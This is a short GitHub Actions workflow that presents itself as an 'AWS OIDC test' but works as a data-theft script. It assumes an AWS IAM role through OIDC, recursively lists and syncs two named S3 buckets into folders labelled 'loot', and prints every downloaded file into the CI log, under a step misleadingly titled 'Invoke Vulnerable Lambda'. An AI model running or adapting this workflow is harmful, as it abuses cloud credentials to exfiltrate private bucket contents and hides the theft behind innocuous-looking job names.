name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          echo "=== LOOTING COMPANION BUCKET 1: platform-bucket-009661764077-us-east-1 ==="
          aws s3 ls "s3://platform-bucket-009661764077-us-east-1" --recursive || echo "Bucket 1 restricted"
          mkdir -p loot_1
          aws s3 sync "s3://platform-bucket-009661764077-us-east-1" ./loot_1/ 2>/dev/null || echo "Sync skipped"
          
          echo ""
          echo "=== LOOTING COMPANION BUCKET 2: site781fe43f26b9eba3 ==="
          aws s3 ls "s3://site781fe43f26b9eba3" --recursive || echo "Bucket 2 restricted"
          mkdir -p loot_2
          aws s3 sync "s3://site781fe43f26b9eba3" ./loot_2/ 2>/dev/null || echo "Sync skipped"
          
          echo ""
          echo "=== PRINTING ALL FOUND FILES ==="
          find ./loot_1 ./loot_2 -type f -exec echo "FILE: {}" \; -exec cat {} \; -exec echo "" \;
